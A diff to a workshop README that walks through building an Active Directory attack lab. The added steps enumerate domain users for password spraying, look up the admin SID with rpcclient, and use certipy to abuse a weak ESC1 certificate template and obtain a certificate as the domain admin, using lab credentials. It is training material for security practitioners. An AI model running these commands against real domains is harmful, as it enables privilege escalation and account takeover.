@@ -2,7 +2,7 @@
 
 This repo was created for the gracious folks at Wild West Hackin' Fest, who picked us up, dusted us off and said "here's another chance guys, go get 'em!" ...and who gave us an opportunity to run a rapid fire workshop about lab building.
 
-Anyway, here's the Defensive Origins crew builds labs!
+Anyway, here's how the Defensive Origins crew builds labs!
 
 
 
@@ -442,6 +442,36 @@ ls
 
 </blockquote></details>
 
+<Details><summary>
+
+## &#x2465; Get AD Users 
+
+</summary><blockquote>
+
+**Get Active Directory User Information**
+
+This Python class was written to enumerate AD users as either individuals or all users. We are going to use it here to gather a list of users from the Active Directory environment and for later use as the user list for password spraying.
+<br />
+
+The following command is used to dump the list of AD users to the console and to create a file (tee) in the /opt/ directory called adusers.txt.
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+```bash
+GetADUsers.py -all -ts doazlab.com/doadmin:'DOLabAdmin1!' -dc-ip 192.168.2.4 |tee -a /opt/adusers.txt
+
+```
+
+| ![Get AD Users](img/GetADUsers.png) |
+|------------------------------------------------|
+
+&#x21E8; *Step complete. Go to the next step!*
+
+</blockquote></details>
+
+
+<Details><summary>
+
 ## &#x2462; Interrogate Service Principals 
 
 </summary><blockquote>
@@ -768,20 +798,29 @@ cat adcs*.txt
 | ![ESC1 Vulnerability](img/esc1-vuln.jpg) |
 |------------------------------------------------|
 
-In the next step, we will attempt to exploit one of the weak certificate templates.
+In the next step, we will attempt to exploit one of the weak certificate templates. But, first we need to find a user SID and set a var. Basically, Microsoft tried to fix a thing with a cheesy little "protection" mechanism that required a user's SID to be submitted with a certificate request. Legit, from MS patch to not fixed anymore was like 17 seconds. 
 
 | &#x1F427; Bash Input | Linux Host: Nux01 |
 |----------------------|-------------------|
 ```bash
+DOADMINSID=$(rpcclient -U noprivuser%'N0PrivU53R' 192.168.2.4 -c "lookupnames doadmin" | awk '{print $2}') 
+printf "\n $DOADMINSID \n\n"
 certipy req -target-ip 192.168.2.4 -u noprivuser@doazlab.com -p 'N0PrivU53R' -ca doazlab-DC01-CA -template DOAZLab_User -dc-ip 192.168.2.4 -upn doadmin@doazlab.com
+```
+
+| &#x1F427; Bash Input | Linux Host: Nux01 |
+|----------------------|-------------------|
+
+```
+cd /opt/Certipy
+source /root/pyenv/Certipy/bin/activate
+certipy req -target-ip 192.168.2.4 -u noprivuser@doazlab.com -p 'N0PrivU53R' -ca doazlab-DC01-CA -template DOAZLab_User -dc-ip 192.168.2.4 -upn doadmin@doazlab.com -sid $DOADMINSID
 ```
 
 | ![Certipy Request Cert](img/certipy-req.jpg) |
 |------------------------------------------------|
 
 UnPac the Hash Attack
-
-
 
 | &#x1F427; Bash Input | Linux Host: Nux01 |
 |----------------------|-------------------|
@@ -832,7 +871,7 @@ Chrome Input:
 - Username: `chromeuser`
 - Password: `chromepass1!`
 
-After inputting username and password values, follow the operations described below and shown in the subsequent screenshot. 
+After inputing username and password values, follow the operations described below and shown in the subsequent screenshot. 
 
 1. Click **Login** button.
 2. Click the circled **key** in the right portion of the address bar.
@@ -861,7 +900,7 @@ Edge:
 
 The process for saving the password in Edge is similar. After clicking **Login**, click the ellipsis at the far right of the address bar. You will be prompted to and should click on **Manage Passwords**.
 
-| ![Edge Manage Passwords](img/manage-passwords.jpg) |
+| ![Edge Manage Passwords](img/edge-manage-passwords.jpg) |
 |------------------------------------------------|
 
 After clicking on **Manage Passwords**, you should be prompted to save the `edgeuser` credential entered in this form. 
